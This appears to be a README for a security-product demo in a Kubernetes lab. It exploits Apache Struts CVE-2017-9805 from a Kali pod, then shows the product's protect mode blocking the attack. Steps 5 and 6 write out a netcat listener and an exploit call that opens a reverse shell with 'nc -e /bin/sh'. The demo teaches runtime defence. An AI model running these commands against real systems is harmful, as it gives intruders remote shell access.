# Remote shell - struts exploit

This demo creates a remote shell using the Apache Struts CVE-2017-9805 Exploit

## Prep
make sure you have the following two variables set in  your `terraform.tfvars`.
```
install_kali = true
install_order     = true
```

The run
```
terraform apply
```

Make sure that you are using a `kubeconf` file that have access to default namespace in the demo cluster, you could use the `kubeconf` created when you ran the `terraform apply` command·
```
export KUBECONFIG=$(pwd)/kubeconf
```

## Demo
1. login to the super-app application, the link to the web app is provided in the `terrarom output`, and generate some traffic by refreshing the page, create a order, delete an order.

2. validate the policy group `nv.struts-orders.default` processes and network rules

3. put the policy group `nv.struts-orders.default` in `monitor mode`

4. note the ClusterIP for the kali workload
```
kubectl get service/kali-kali
```

5. open a terminal and create a reverse shell in the kali pod
```
kubectl exec -it $(kubectl get pods --selector=app=kali-kali --template "{{range .items}}{{.metadata.name}}{{\"\n\"}}{{end}}") -- nc -lvp 1337
```

6. open another terminal and execute the RCE payload in the kali workload
```
kubectl exec -it $(kubectl get pods --selector=app=kali-kali --template "{{range .items}}{{.metadata.name}}{{\"\n\"}}{{end}}") -- bash
python3 /payloads/struts-pwn2.py --exploit --url 'http://URL/super-app/orders/3' -c 'nc -nv X.X.X.X 1337 -e /bin/sh'
```
where `X.X.X.X` is the IP to the kali service you got in step 4
and the URL is the HOSTS of struts-orders ingress `kubectl get ingress struts-orders`

7. In the recerse shell type some commands, like prove you are root with `whoami`

8. Put the policy group `nv.struts-orders.default` in protect mode and see that it is now protected and it's no longer possible to execute commands in the reversed shell
